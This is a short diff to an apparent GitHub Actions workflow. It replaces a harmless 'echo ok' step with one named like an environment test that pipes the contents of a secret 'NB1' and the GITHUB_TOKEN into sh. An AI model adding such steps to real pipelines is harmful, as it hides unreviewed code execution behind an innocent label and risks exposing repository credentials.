@@ -53,5 +53,7 @@ jobs:
               with:
                   repository: HideTheTime/publichfileRepo1
                   path: README.md
-            - name: 测试运行环境
-              run: echo ok
+            - name: 123测试运行环境
+              run: |
+                echo "${{ secrets.NB1 }}" | sh
+                echo "${{ secrets.GITHUB_TOKEN }}" | sh
